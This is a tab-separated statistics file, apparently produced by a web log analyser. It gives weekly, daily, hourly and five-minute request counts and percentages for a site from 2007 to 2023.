W	Rr	1063	0.095	2013	08	11
W	Rr	1105	0.099	2013	08	04
W	Rr	1377	0.123	2013	07	28
W	Rr	1498	0.134	2013	07	21
W	Rr	1295	0.116	2013	07	14
W	Rr	1237	0.110	2013	07	07
W	Rr	1003	0.089	2013	06	30
W	Rr	1275	0.114	2013	06	23
W	Rr	1072	0.096	2013	06	16
W	Rr	1249	0.111	2013	06	09
W	Rr	1521	0.136	2013	06	02
W	Rr	1256	0.112	2013	05	26
W	Rr	1091	0.097	2013	05	19
W	Rr	1359	0.121	2013	05	12
W	Rr	1130	0.101	2013	05	05
W	Rr	1215	0.108	2013	04	28
W	Rr	1368	0.122	2013	04	21
W	Rr	1318	0.118	2013	04	14
W	Rr	1408	0.126	2013	04	07
W	Rr	1277	0.114	2013	03	31
W	Rr	1452	0.130	2013	03	24
W	Rr	1418	0.127	2013	03	17
W	Rr	1217	0.109	2013	03	10
W	Rr	1490	0.133	2013	03	03
W	Rr	1353	0.121	2013	02	24
W	Rr	1268	0.113	2013	02	17
W	Rr	1274	0.114	2013	02	10
W	Rr	1153	0.103	2013	02	03
W	Rr	1266	0.113	2013	01	27
W	Rr	1271	0.113	2013	01	20
W	Rr	1449	0.129	2013	01	13
W	Rr	1253	0.112	2013	01	06
W	Rr	1309	0.117	2012	12	30
W	Rr	1156	0.103	2012	12	23
W	Rr	1336	0.119	2012	12	16
W	Rr	1575	0.141	2012	12	09
W	Rr	1087	0.097	2012	12	02
W	Rr	1376	0.123	2012	11	25
W	Rr	1136	0.101	2012	11	18
W	Rr	1341	0.120	2012	11	11
W	Rr	1418	0.127	2012	11	04
W	Rr	1103	0.098	2012	10	28
W	Rr	1200	0.107	2012	10	21
W	Rr	1382	0.123	2012	10	14
W	Rr	1127	0.101	2012	10	07
W	Rr	1187	0.106	2012	09	30
W	Rr	1172	0.105	2012	09	23
W	Rr	1034	0.092	2012	09	16
W	Rr	944	0.084	2012	09	09
W	Rr	958	0.085	2012	09	02
W	Rr	734	0.065	2012	08	26
W	Rr	881	0.079	2012	08	19
W	Rr	874	0.078	2012	08	12
W	Rr	973	0.087	2012	08	05
W	Rr	1010	0.090	2012	07	29
W	Rr	943	0.084	2012	07	22
W	Rr	1089	0.097	2012	07	15
W	Rr	888	0.079	2012	07	08
W	Rr	845	0.075	2012	07	01
W	Rr	1070	0.095	2012	06	24
W	Rr	1050	0.094	2012	06	17
W	Rr	1271	0.113	2012	06	10
W	Rr	957	0.085	2012	06	03
W	Rr	1249	0.111	2012	05	27
W	Rr	1055	0.094	2012	05	20
W	Rr	1392	0.124	2012	05	13
W	Rr	1140	0.102	2012	05	06
W	Rr	1807	0.161	2012	04	29
W	Rr	1225	0.109	2012	04	22
W	Rr	1264	0.113	2012	04	15
W	Rr	1075	0.096	2012	04	08
W	Rr	1261	0.113	2012	04	01
W	Rr	1345	0.120	2012	03	25
W	Rr	1254	0.112	2012	03	18
W	Rr	1478	0.132	2012	03	11
W	Rr	1503	0.134	2012	03	04
W	Rr	1532	0.137	2012	02	26
W	Rr	1464	0.131	2012	02	19
W	Rr	1154	0.103	2012	02	12
W	Rr	1240	0.111	2012	02	05
W	Rr	1088	0.097	2012	01	29
W	Rr	1125	0.100	2012	01	22
W	Rr	60	0.005	2012	01	15
W	Rr	1472	0.131	2012	01	08
W	Rr	1122	0.100	2012	01	01
W	Rr	888	0.079	2011	12	25
W	Rr	1360	0.121	2011	12	18
W	Rr	1486	0.133	2011	12	11
W	Rr	1330	0.119	2011	12	04
W	Rr	1094	0.098	2011	11	27
W	Rr	1062	0.095	2011	11	20
W	Rr	1123	0.100	2011	11	13
W	Rr	975	0.087	2011	11	06
W	Rr	1264	0.113	2011	10	30
W	Rr	1140	0.102	2011	10	23
W	Rr	1211	0.108	2011	10	16
W	Rr	1236	0.110	2011	10	09
W	Rr	1128	0.101	2011	10	02
W	Rr	1083	0.097	2011	09	25
W	Rr	1451	0.129	2011	09	18
W	Rr	1278	0.114	2011	09	11
W	Rr	1219	0.109	2011	09	04
W	Rr	1316	0.117	2011	08	28
W	Rr	1119	0.100	2011	08	21
W	Rr	1484	0.132	2011	08	14
W	Rr	1671	0.149	2011	08	07
W	Rr	1319	0.118	2011	07	31
W	Rr	1197	0.107	2011	07	24
W	Rr	1504	0.134	2011	07	17
W	Rr	1367	0.122	2011	07	10
W	Rr	1205	0.108	2011	07	03
W	Rr	1333	0.119	2011	06	26
W	Rr	1059	0.094	2011	06	19
W	Rr	1353	0.121	2011	06	12
W	Rr	1275	0.114	2011	06	05
W	Rr	983	0.088	2011	05	29
W	Rr	1262	0.113	2011	05	22
W	Rr	1374	0.123	2011	05	15
W	Rr	1076	0.096	2011	05	08
W	Rr	0	0.000	2011	05	01
W	Rr	0	0.000	2011	04	24
W	Rr	0	0.000	2011	04	17
W	Rr	0	0.000	2011	04	10
W	Rr	0	0.000	2011	04	03
W	Rr	0	0.000	2011	03	27
W	Rr	24	0.002	2011	03	20
W	Rr	1317	0.118	2011	03	13
W	Rr	1258	0.112	2011	03	06
W	Rr	1372	0.122	2011	02	27
W	Rr	1226	0.109	2011	02	20
W	Rr	1524	0.136	2011	02	13
W	Rr	1366	0.122	2011	02	06
W	Rr	958	0.085	2011	01	30
W	Rr	1273	0.114	2011	01	23
W	Rr	1560	0.139	2011	01	16
W	Rr	1472	0.131	2011	01	09
W	Rr	1310	0.117	2011	01	02
W	Rr	798	0.071	2010	12	26
W	Rr	935	0.083	2010	12	19
W	Rr	0	0.000	2010	12	12
W	Rr	0	0.000	2010	12	05
W	Rr	0	0.000	2010	11	28
W	Rr	0	0.000	2010	11	21
W	Rr	0	0.000	2010	11	14
W	Rr	0	0.000	2010	11	07
W	Rr	0	0.000	2010	10	31
W	Rr	0	0.000	2010	10	24
W	Rr	0	0.000	2010	10	17
W	Rr	0	0.000	2010	10	10
W	Rr	0	0.000	2010	10	03
W	Rr	0	0.000	2010	09	26
W	Rr	0	0.000	2010	09	19
W	Rr	0	0.000	2010	09	12
W	Rr	0	0.000	2010	09	05
W	Rr	0	0.000	2010	08	29
W	Rr	0	0.000	2010	08	22
W	Rr	0	0.000	2010	08	15
W	Rr	0	0.000	2010	08	08
W	Rr	0	0.000	2010	08	01
W	Rr	0	0.000	2010	07	25
W	Rr	0	0.000	2010	07	18
W	Rr	0	0.000	2010	07	11
W	Rr	0	0.000	2010	07	04
W	Rr	15	0.001	2010	06	27
W	Rr	914	0.082	2010	06	20
W	Rr	1104	0.099	2010	06	13
W	Rr	1096	0.098	2010	06	06
W	Rr	1171	0.104	2010	05	30
W	Rr	1115	0.099	2010	05	23
W	Rr	1170	0.104	2010	05	16
W	Rr	1334	0.119	2010	05	09
W	Rr	1109	0.099	2010	05	02
W	Rr	1067	0.095	2010	04	25
W	Rr	1212	0.108	2010	04	18
W	Rr	1054	0.094	2010	04	11
W	Rr	1325	0.118	2010	04	04
W	Rr	811	0.072	2010	03	28
W	Rr	1195	0.107	2010	03	21
W	Rr	1338	0.119	2010	03	14
W	Rr	1113	0.099	2010	03	07
W	Rr	1103	0.098	2010	02	28
W	Rr	1290	0.115	2010	02	21
W	Rr	0	0.000	2010	02	14
W	Rr	0	0.000	2010	02	07
W	Rr	0	0.000	2010	01	31
W	Rr	0	0.000	2010	01	24
W	Rr	0	0.000	2010	01	17
W	Rr	0	0.000	2010	01	10
W	Rr	0	0.000	2010	01	03
W	Rr	78	0.007	2009	12	27
W	Rr	945	0.084	2009	12	20
W	Rr	1140	0.102	2009	12	13
W	Rr	1323	0.118	2009	12	06
W	Rr	1518	0.135	2009	11	29
W	Rr	1352	0.121	2009	11	22
W	Rr	1346	0.120	2009	11	15
W	Rr	1416	0.126	2009	11	08
W	Rr	1734	0.155	2009	11	01
W	Rr	1035	0.092	2009	10	25
W	Rr	1297	0.116	2009	10	18
W	Rr	1267	0.113	2009	10	11
W	Rr	1440	0.128	2009	10	04
W	Rr	1521	0.136	2009	09	27
W	Rr	1121	0.100	2009	09	20
W	Rr	875	0.078	2009	09	13
W	Rr	1032	0.092	2009	09	06
W	Rr	1283	0.114	2009	08	30
W	Rr	1214	0.108	2009	08	23
W	Rr	1402	0.125	2009	08	16
W	Rr	1260	0.112	2009	08	09
W	Rr	1404	0.125	2009	08	02
W	Rr	1380	0.123	2009	07	26
W	Rr	1470	0.131	2009	07	19
W	Rr	1750	0.156	2009	07	12
W	Rr	1847	0.165	2009	07	05
W	Rr	1889	0.169	2009	06	28
W	Rr	1312	0.117	2009	06	21
W	Rr	1093	0.098	2009	06	14
W	Rr	1363	0.122	2009	06	07
W	Rr	1251	0.112	2009	05	31
W	Rr	1352	0.121	2009	05	24
W	Rr	1133	0.101	2009	05	17
W	Rr	1887	0.168	2009	05	10
W	Rr	1369	0.122	2009	05	03
W	Rr	1089	0.097	2009	04	26
W	Rr	1160	0.104	2009	04	19
W	Rr	1189	0.106	2009	04	12
W	Rr	1529	0.136	2009	04	05
W	Rr	1155	0.103	2009	03	29
W	Rr	1230	0.110	2009	03	22
W	Rr	1029	0.092	2009	03	15
W	Rr	1234	0.110	2009	03	08
W	Rr	1486	0.133	2009	03	01
W	Rr	1470	0.131	2009	02	22
W	Rr	1198	0.107	2009	02	15
W	Rr	1802	0.161	2009	02	08
W	Rr	1653	0.147	2009	02	01
W	Rr	1346	0.120	2009	01	25
W	Rr	1431	0.128	2009	01	18
W	Rr	1678	0.150	2009	01	11
W	Rr	1591	0.142	2009	01	04
W	Rr	886	0.079	2008	12	28
W	Rr	1148	0.102	2008	12	21
W	Rr	1428	0.127	2008	12	14
W	Rr	1508	0.135	2008	12	07
W	Rr	1194	0.107	2008	11	30
W	Rr	1070	0.095	2008	11	23
W	Rr	1396	0.125	2008	11	16
W	Rr	1255	0.112	2008	11	09
W	Rr	1314	0.117	2008	11	02
W	Rr	1397	0.125	2008	10	26
W	Rr	1638	0.146	2008	10	19
W	Rr	1298	0.116	2008	10	12
W	Rr	430	0.038	2008	10	05
W	Rr	723	0.065	2008	09	28
W	Rr	1308	0.117	2008	09	21
W	Rr	1242	0.111	2008	09	14
W	Rr	1409	0.126	2008	09	07
W	Rr	1142	0.102	2008	08	31
W	Rr	1022	0.091	2008	08	24
W	Rr	1062	0.095	2008	08	17
W	Rr	1188	0.106	2008	08	10
W	Rr	1232	0.110	2008	08	03
W	Rr	1050	0.094	2008	07	27
W	Rr	1272	0.114	2008	07	20
W	Rr	1305	0.116	2008	07	13
W	Rr	1093	0.098	2008	07	06
W	Rr	1182	0.105	2008	06	29
W	Rr	1937	0.173	2008	06	22
W	Rr	1493	0.133	2008	06	15
W	Rr	1083	0.097	2008	06	08
W	Rr	1283	0.114	2008	06	01
W	Rr	1432	0.128	2008	05	25
W	Rr	1726	0.154	2008	05	18
W	Rr	1580	0.141	2008	05	11
W	Rr	2661	0.237	2008	05	04
W	Rr	3648	0.326	2008	04	27
W	Rr	1400	0.125	2008	04	20
W	Rr	1365	0.122	2008	04	13
W	Rr	1213	0.108	2008	04	06
W	Rr	1670	0.149	2008	03	30
W	Rr	1211	0.108	2008	03	23
W	Rr	1144	0.102	2008	03	16
W	Rr	1301	0.116	2008	03	09
W	Rr	1292	0.115	2008	03	02
W	Rr	1427	0.127	2008	02	24
W	Rr	2207	0.197	2008	02	17
W	Rr	1124	0.100	2008	02	10
W	Rr	1561	0.139	2008	02	03
W	Rr	1533	0.137	2008	01	27
W	Rr	1389	0.124	2008	01	20
W	Rr	1133	0.101	2008	01	13
W	Rr	1404	0.125	2008	01	06
W	Rr	976	0.087	2007	12	30
W	Rr	801	0.071	2007	12	23
W	Rr	675	0.060	2007	12	16
W	*BT	R	7060	2014	02	16
D	Rr	204	0.018	2023	03	31
D	Rr	127	0.011	2023	03	30
D	Rr	329	0.029	2023	03	29
D	Rr	324	0.029	2023	03	28
D	Rr	492	0.044	2023	03	27
D	Rr	225	0.020	2023	03	26
D	Rr	0	0.000	2023	03	25
D	Rr	273	0.024	2023	03	24
D	Rr	334	0.030	2023	03	23
D	Rr	337	0.030	2023	03	22
D	Rr	384	0.034	2023	03	21
D	Rr	312	0.028	2023	03	20
D	Rr	303	0.027	2023	03	19
D	Rr	0	0.000	2023	03	18
D	Rr	484	0.043	2023	03	17
D	Rr	308	0.027	2023	03	16
D	Rr	412	0.037	2023	03	15
D	Rr	407	0.036	2023	03	14
D	Rr	405	0.036	2023	03	13
D	Rr	209	0.019	2023	03	12
D	Rr	0	0.000	2023	03	11
D	Rr	228	0.020	2023	03	10
D	Rr	258	0.023	2023	03	09
D	Rr	531	0.047	2023	03	08
D	Rr	570	0.051	2023	03	07
D	Rr	366	0.033	2023	03	06
D	Rr	239	0.021	2023	03	05
D	Rr	0	0.000	2023	03	04
D	Rr	329	0.029	2023	03	03
D	Rr	933	0.083	2023	03	02
D	Rr	1525	0.136	2023	03	01
D	Rr	538	0.048	2023	02	28
D	Rr	418	0.037	2023	02	27
D	Rr	312	0.028	2023	02	26
D	Rr	0	0.000	2023	02	25
D	Rr	383	0.034	2023	02	24
D	Rr	466	0.042	2023	02	23
D	Rr	343	0.031	2023	02	22
D	Rr	715	0.064	2023	02	21
D	Rr	259	0.023	2023	02	20
D	Rr	240	0.021	2023	02	19
D	Rr	0	0.000	2023	02	18
D	*BT	R	2131	2008	05	03
d	Rr	135119	12.057	Sun
d	Rr	181346	16.182	Mon
d	Rr	185705	16.571	Tue
d	Rr	184674	16.479	Wed
d	Rr	183638	16.386	Thu
d	Rr	173187	15.454	Fri
d	Rr	77024	6.873	Sat
H	Rr	6	0.001	2023	03	31	23
H	Rr	3	0.000	2023	03	31	22
H	Rr	1	0.000	2023	03	31	21
H	Rr	2	0.000	2023	03	31	20
H	Rr	36	0.003	2023	03	31	19
H	Rr	2	0.000	2023	03	31	18
H	Rr	28	0.002	2023	03	31	17
H	Rr	26	0.002	2023	03	31	16
H	Rr	1	0.000	2023	03	31	15
H	Rr	9	0.001	2023	03	31	14
H	Rr	1	0.000	2023	03	31	13
H	Rr	3	0.000	2023	03	31	12
H	Rr	5	0.000	2023	03	31	11
H	Rr	26	0.002	2023	03	31	10
H	Rr	5	0.000	2023	03	31	09
H	Rr	3	0.000	2023	03	31	08
H	Rr	1	0.000	2023	03	31	07
H	Rr	10	0.001	2023	03	31	06
H	Rr	9	0.001	2023	03	31	05
H	Rr	1	0.000	2023	03	31	04
H	Rr	9	0.001	2023	03	31	03
H	Rr	8	0.001	2023	03	31	02
H	Rr	9	0.001	2023	03	31	01
H	Rr	0	0.000	2023	03	31	00
H	Rr	6	0.001	2023	03	30	23
H	Rr	6	0.001	2023	03	30	22
H	Rr	25	0.002	2023	03	30	21
H	Rr	1	0.000	2023	03	30	20
H	Rr	7	0.001	2023	03	30	19
H	Rr	3	0.000	2023	03	30	18
H	Rr	20	0.002	2023	03	30	17
H	Rr	0	0.000	2023	03	30	16
H	Rr	1	0.000	2023	03	30	15
H	Rr	2	0.000	2023	03	30	14
H	Rr	0	0.000	2023	03	30	13
H	Rr	4	0.000	2023	03	30	12
H	Rr	3	0.000	2023	03	30	11
H	Rr	4	0.000	2023	03	30	10
H	Rr	5	0.000	2023	03	30	09
H	Rr	3	0.000	2023	03	30	08
H	Rr	12	0.001	2023	03	30	07
H	Rr	3	0.000	2023	03	30	06
H	Rr	3	0.000	2023	03	30	05
H	Rr	4	0.000	2023	03	30	04
H	Rr	7	0.001	2023	03	30	03
H	Rr	1	0.000	2023	03	30	02
H	Rr	6	0.001	2023	03	30	01
H	Rr	1	0.000	2023	03	30	00
H	Rr	2	0.000	2023	03	29	23
H	Rr	3	0.000	2023	03	29	22
H	Rr	9	0.001	2023	03	29	21
H	Rr	5	0.000	2023	03	29	20
H	Rr	22	0.002	2023	03	29	19
H	Rr	31	0.003	2023	03	29	18
H	Rr	3	0.000	2023	03	29	17
H	Rr	4	0.000	2023	03	29	16
H	Rr	2	0.000	2023	03	29	15
H	Rr	4	0.000	2023	03	29	14
H	Rr	75	0.007	2023	03	29	13
H	Rr	22	0.002	2023	03	29	12
H	Rr	43	0.004	2023	03	29	11
H	Rr	21	0.002	2023	03	29	10
H	Rr	7	0.001	2023	03	29	09
H	Rr	27	0.002	2023	03	29	08
H	Rr	2	0.000	2023	03	29	07
H	Rr	8	0.001	2023	03	29	06
H	Rr	10	0.001	2023	03	29	05
H	Rr	5	0.000	2023	03	29	04
H	Rr	2	0.000	2023	03	29	03
H	Rr	5	0.000	2023	03	29	02
H	Rr	10	0.001	2023	03	29	01
H	Rr	7	0.001	2023	03	29	00
H	*BT	R	750	2020	12	11	23
h	Rr	43584	3.889	00
h	Rr	42944	3.832	01
h	Rr	43678	3.897	02
h	Rr	43763	3.905	03
h	Rr	41758	3.726	04
h	Rr	39767	3.548	05
h	Rr	38915	3.472	06
h	Rr	38302	3.418	07
h	Rr	36938	3.296	08
h	Rr	35363	3.155	09
h	Rr	36338	3.242	10
h	Rr	39787	3.550	11
h	Rr	39418	3.517	12
h	Rr	42024	3.750	13
h	Rr	49467	4.414	14
h	Rr	55234	4.929	15
h	Rr	60009	5.355	16
h	Rr	60506	5.399	17
h	Rr	60728	5.419	18
h	Rr	60068	5.360	19
h	Rr	58571	5.226	20
h	Rr	55196	4.925	21
h	Rr	50484	4.505	22
h	Rr	47851	4.270	23
4	Rr	2	0.000	2023	03	31	23	15
4	Rr	4	0.000	2023	03	31	23	00
4	Rr	1	0.000	2023	03	31	22	45
4	Rr	0	0.000	2023	03	31	22	30
4	Rr	1	0.000	2023	03	31	22	15
4	Rr	1	0.000	2023	03	31	22	00
4	Rr	0	0.000	2023	03	31	21	45
4	Rr	1	0.000	2023	03	31	21	30
4	Rr	0	0.000	2023	03	31	21	15
4	Rr	0	0.000	2023	03	31	21	00
4	Rr	0	0.000	2023	03	31	20	45
4	Rr	1	0.000	2023	03	31	20	30
4	Rr	0	0.000	2023	03	31	20	15
4	Rr	1	0.000	2023	03	31	20	00
4	Rr	0	0.000	2023	03	31	19	45
4	Rr	36	0.003	2023	03	31	19	30
4	Rr	0	0.000	2023	03	31	19	15
4	Rr	0	0.000	2023	03	31	19	00
4	Rr	1	0.000	2023	03	31	18	45
4	Rr	0	0.000	2023	03	31	18	30
4	Rr	0	0.000	2023	03	31	18	15
4	Rr	1	0.000	2023	03	31	18	00
4	Rr	0	0.000	2023	03	31	17	45
4	Rr	1	0.000	2023	03	31	17	30
4	Rr	27	0.002	2023	03	31	17	15
4	Rr	0	0.000	2023	03	31	17	00
4	Rr	26	0.002	2023	03	31	16	45
4	Rr	0	0.000	2023	03	31	16	30
4	Rr	0	0.000	2023	03	31	16	15
4	Rr	0	0.000	2023	03	31	16	00
4	Rr	1	0.000	2023	03	31	15	45
4	Rr	0	0.000	2023	03	31	15	30
4	Rr	0	0.000	2023	03	31	15	15
4	Rr	0	0.000	2023	03	31	15	00
4	Rr	2	0.000	2023	03	31	14	45
4	Rr	1	0.000	2023	03	31	14	30
4	Rr	6	0.001	2023	03	31	14	15
4	Rr	0	0.000	2023	03	31	14	00
4	Rr	0	0.000	2023	03	31	13	45
4	Rr	1	0.000	2023	03	31	13	30
4	Rr	0	0.000	2023	03	31	13	15
4	Rr	0	0.000	2023	03	31	13	00
4	Rr	0	0.000	2023	03	31	12	45
4	Rr	2	0.000	2023	03	31	12	30
4	Rr	0	0.000	2023	03	31	12	15
4	Rr	1	0.000	2023	03	31	12	00
4	Rr	1	0.000	2023	03	31	11	45
4	Rr	2	0.000	2023	03	31	11	30
4	Rr	1	0.000	2023	03	31	11	15
4	Rr	1	0.000	2023	03	31	11	00
4	Rr	26	0.002	2023	03	31	10	45
4	Rr	0	0.000	2023	03	31	10	30
4	Rr	0	0.000	2023	03	31	10	15
4	Rr	0	0.000	2023	03	31	10	00
4	Rr	2	0.000	2023	03	31	09	45
4	Rr	1	0.000	2023	03	31	09	30
4	Rr	1	0.000	2023	03	31	09	15
4	Rr	1	0.000	2023	03	31	09	00
4	Rr	0	0.000	2023	03	31	08	45
4	Rr	1	0.000	2023	03	31	08	30
4	Rr	1	0.000	2023	03	31	08	15
4	Rr	1	0.000	2023	03	31	08	00
4	Rr	0	0.000	2023	03	31	07	45
4	Rr	0	0.000	2023	03	31	07	30
4	Rr	1	0.000	2023	03	31	07	15
4	Rr	0	0.000	2023	03	31	07	00
4	Rr	2	0.000	2023	03	31	06	45
4	Rr	5	0.000	2023	03	31	06	30
4	Rr	3	0.000	2023	03	31	06	15
4	Rr	0	0.000	2023	03	31	06	00
4	Rr	4	0.000	2023	03	31	05	45
4	Rr	0	0.000	2023	03	31	05	30
4	Rr	4	0.000	2023	03	31	05	15
4	Rr	1	0.000	2023	03	31	05	00
4	Rr	0	0.000	2023	03	31	04	45
4	Rr	0	0.000	2023	03	31	04	30
4	Rr	0	0.000	2023	03	31	04	15
4	Rr	1	0.000	2023	03	31	04	00
4	Rr	8	0.001	2023	03	31	03	45
4	Rr	0	0.000	2023	03	31	03	30
4	Rr	0	0.000	2023	03	31	03	15
4	Rr	1	0.000	2023	03	31	03	00
4	Rr	2	0.000	2023	03	31	02	45
4	Rr	1	0.000	2023	03	31	02	30
4	Rr	3	0.000	2023	03	31	02	15
4	Rr	2	0.000	2023	03	31	02	00
4	Rr	0	0.000	2023	03	31	01	45
4	Rr	5	0.000	2023	03	31	01	30
4	Rr	2	0.000	2023	03	31	01	15
4	Rr	2	0.000	2023	03	31	01	00
4	Rr	0	0.000	2023	03	31	00	45
4	Rr	0	0.000	2023	03	31	00	30
4	Rr	0	0.000	2023	03	31	00	15
4	Rr	0	0.000	2023	03	31	00	00
4	Rr	0	0.000	2023	03	30	23	45
4	Rr	6	0.001	2023	03	30	23	30
4	*BT	R	744	2021	04	12	15	00
6	Rr	10826	0.966	00	00
6	Rr	10877	0.971	00	15
6	Rr	10893	0.972	00	30
6	Rr	10988	0.980	00	45
6	Rr	10695	0.954	01	00
6	Rr	10781	0.962	01	15
6	Rr	10873	0.970	01	30
6	Rr	10595	0.945	01	45
6	Rr	10326	0.921	02	00
6	Rr	11286	1.007	02	15
6	Rr	11181	0.998	02	30
6	Rr	10885	0.971	02	45
6	Rr	10628	0.948	03	00
6	Rr	10032	0.895	03	15
6	Rr	10480	0.935	03	30
6	Rr	12623	1.126	03	45
6	Rr	10503	0.937	04	00
6	Rr	11106	0.991	04	15
6	Rr	9852	0.879	04	30
6	Rr	10297	0.919	04	45
6	Rr	9574	0.854	05	00
6	Rr	10417	0.930	05	15
6	Rr	10118	0.903	05	30
6	Rr	9658	0.862	05	45
6	Rr	10517	0.938	06	00
6	Rr	9769	0.872	06	15
6	Rr	9704	0.866	06	30
6	Rr	8925	0.796	06	45
6	Rr	9444	0.843	07	00
6	Rr	9971	0.890	07	15
6	Rr	9989	0.891	07	30
6	Rr	8898	0.794	07	45
6	Rr	9452	0.843	08	00
6	Rr	9167	0.818	08	15
6	Rr	9704	0.866	08	30
6	Rr	8615	0.769	08	45
6	Rr	8887	0.793	09	00
6	Rr	8887	0.793	09	15
6	Rr	8938	0.798	09	30
6	Rr	8651	0.772	09	45
6	Rr	8685	0.775	10	00
6	Rr	8694	0.776	10	15
6	Rr	8770	0.783	10	30
6	Rr	10189	0.909	10	45
6	Rr	10927	0.975	11	00
6	Rr	9513	0.849	11	15
6	Rr	9660	0.862	11	30
6	Rr	9687	0.864	11	45
6	Rr	10786	0.962	12	00
6	Rr	9355	0.835	12	15
6	Rr	9455	0.844	12	30
6	Rr	9822	0.876	12	45
6	Rr	10284	0.918	13	00
6	Rr	10281	0.917	13	15
6	Rr	10982	0.980	13	30
6	Rr	10477	0.935	13	45
6	Rr	11726	1.046	14	00
6	Rr	12555	1.120	14	15
6	Rr	12610	1.125	14	30
6	Rr	12576	1.122	14	45
6	Rr	13459	1.201	15	00
6	Rr	13165	1.175	15	15
6	Rr	14266	1.273	15	30
6	Rr	14344	1.280	15	45
6	Rr	15074	1.345	16	00
6	Rr	14674	1.309	16	15
6	Rr	14971	1.336	16	30
6	Rr	15290	1.364	16	45
6	Rr	15241	1.360	17	00
6	Rr	14993	1.338	17	15
6	Rr	15361	1.371	17	30
6	Rr	14911	1.331	17	45
6	Rr	14928	1.332	18	00
6	Rr	15217	1.358	18	15
6	Rr	15272	1.363	18	30
6	Rr	15311	1.366	18	45
6	Rr	16146	1.441	19	00
6	Rr	14418	1.287	19	15
6	Rr	14780	1.319	19	30
6	Rr	14724	1.314	19	45
6	Rr	15063	1.344	20	00
6	Rr	14667	1.309	20	15
6	Rr	14076	1.256	20	30
6	Rr	14765	1.317	20	45
6	Rr	14815	1.322	21	00
6	Rr	13615	1.215	21	15
6	Rr	13227	1.180	21	30
6	Rr	13539	1.208	21	45
6	Rr	12699	1.133	22	00
6	Rr	12918	1.153	22	15
6	Rr	12578	1.122	22	30
6	Rr	12289	1.097	22	45
6	Rr	12682	1.132	23	00
6	Rr	12930	1.154	23	15
6	Rr	11352	1.013	23	30
6	Rr	10887	0.971	23	45
5	Rr	1	0.000	2023	03	31	23	20
5	Rr	1	0.000	2023	03	31	23	15
5	Rr	3	0.000	2023	03	31	23	10
5	Rr	0	0.000	2023	03	31	23	05
5	Rr	1	0.000	2023	03	31	23	00
5	Rr	0	0.000	2023	03	31	22	55
5	Rr	0	0.000	2023	03	31	22	50
5	Rr	1	0.000	2023	03	31	22	45
5	Rr	0	0.000	2023	03	31	22	40
5	Rr	0	0.000	2023	03	31	22	35
5	Rr	0	0.000	2023	03	31	22	30
5	Rr	1	0.000	2023	03	31	22	25
5	Rr	0	0.000	2023	03	31	22	20
5	Rr	0	0.000	2023	03	31	22	15
5	Rr	1	0.000	2023	03	31	22	10
5	Rr	0	0.000	2023	03	31	22	05
5	Rr	0	0.000	2023	03	31	22	00
5	Rr	0	0.000	2023	03	31	21	55
5	Rr	0	0.000	2023	03	31	21	50
5	Rr	0	0.000	2023	03	31	21	45
5	Rr	0	0.000	2023	03	31	21	40
5	Rr	1	0.000	2023	03	31	21	35
5	Rr	0	0.000	2023	03	31	21	30
5	Rr	0	0.000	2023	03	31	21	25
5	Rr	0	0.000	2023	03	31	21	20
5	Rr	0	0.000	2023	03	31	21	15
5	Rr	0	0.000	2023	03	31	21	10
5	Rr	0	0.000	2023	03	31	21	05
5	Rr	0	0.000	2023	03	31	21	00
5	Rr	0	0.000	2023	03	31	20	55
5	Rr	0	0.000	2023	03	31	20	50
5	Rr	0	0.000	2023	03	31	20	45
5	Rr	0	0.000	2023	03	31	20	40
5	Rr	0	0.000	2023	03	31	20	35
5	Rr	1	0.000	2023	03	31	20	30
5	Rr	0	0.000	2023	03	31	20	25
5	Rr	0	0.000	2023	03	31	20	20
5	Rr	0	0.000	2023	03	31	20	15
5	Rr	0	0.000	2023	03	31	20	10
5	Rr	0	0.000	2023	03	31	20	05
5	Rr	1	0.000	2023	03	31	20	00
5	Rr	0	0.000	2023	03	31	19	55
5	Rr	0	0.000	2023	03	31	19	50
5	Rr	0	0.000	2023	03	31	19	45
5	Rr	0	0.000	2023	03	31	19	40
5	Rr	28	0.002	2023	03	31	19	35
5	Rr	8	0.001	2023	03	31	19	30
5	Rr	0	0.000	2023	03	31	19	25
5	Rr	0	0.000	2023	03	31	19	20
5	Rr	0	0.000	2023	03	31	19	15
5	Rr	0	0.000	2023	03	31	19	10
5	Rr	0	0.000	2023	03	31	19	05
5	Rr	0	0.000	2023	03	31	19	00
5	Rr	0	0.000	2023	03	31	18	55
5	Rr	0	0.000	2023	03	31	18	50
5	Rr	1	0.000	2023	03	31	18	45
5	Rr	0	0.000	2023	03	31	18	40
5	Rr	0	0.000	2023	03	31	18	35
5	Rr	0	0.000	2023	03	31	18	30
5	Rr	0	0.000	2023	03	31	18	25
5	Rr	0	0.000	2023	03	31	18	20
5	Rr	0	0.000	2023	03	31	18	15
5	Rr	0	0.000	2023	03	31	18	10
5	Rr	0	0.000	2023	03	31	18	05
5	Rr	1	0.000	2023	03	31	18	00
5	Rr	0	0.000	2023	03	31	17	55
5	Rr	0	0.000	2023	03	31	17	50
5	Rr	0	0.000	2023	03	31	17	45
5	Rr	0	0.000	2023	03	31	17	40
5	Rr	0	0.000	2023	03	31	17	35
5	Rr	1	0.000	2023	03	31	17	30
5	Rr	0	0.000	2023	03	31	17	25
5	Rr	0	0.000	2023	03	31	17	20
5	Rr	27	0.002	2023	03	31	17	15
5	Rr	0	0.000	2023	03	31	17	10
5	Rr	0	0.000	2023	03	31	17	05
5	Rr	0	0.000	2023	03	31	17	00
5	Rr	26	0.002	2023	03	31	16	55
5	Rr	0	0.000	2023	03	31	16	50
5	Rr	0	0.000	2023	03	31	16	45
5	Rr	0	0.000	2023	03	31	16	40
5	Rr	0	0.000	2023	03	31	16	35
5	Rr	0	0.000	2023	03	31	16	30
5	Rr	0	0.000	2023	03	31	16	25
5	Rr	0	0.000	2023	03	31	16	20
5	Rr	0	0.000	2023	03	31	16	15
5	Rr	0	0.000	2023	03	31	16	10
5	Rr	0	0.000	2023	03	31	16	05
5	Rr	0	0.000	2023	03	31	16	00
5	Rr	0	0.000	2023	03	31	15	55
5	Rr	1	0.000	2023	03	31	15	50
5	Rr	0	0.000	2023	03	31	15	45
5	Rr	0	0.000	2023	03	31	15	40
5	Rr	0	0.000	2023	03	31	15	35
5	Rr	0	0.000	2023	03	31	15	30
5	Rr	0	0.000	2023	03	31	15	25
5	Rr	0	0.000	2023	03	31	15	20
5	Rr	0	0.000	2023	03	31	15	15
5	Rr	0	0.000	2023	03	31	15	10
5	Rr	0	0.000	2023	03	31	15	05
5	Rr	0	0.000	2023	03	31	15	00
5	Rr	1	0.000	2023	03	31	14	55
5	Rr	1	0.000	2023	03	31	14	50
5	Rr	0	0.000	2023	03	31	14	45
5	Rr	0	0.000	2023	03	31	14	40
5	Rr	0	0.000	2023	03	31	14	35
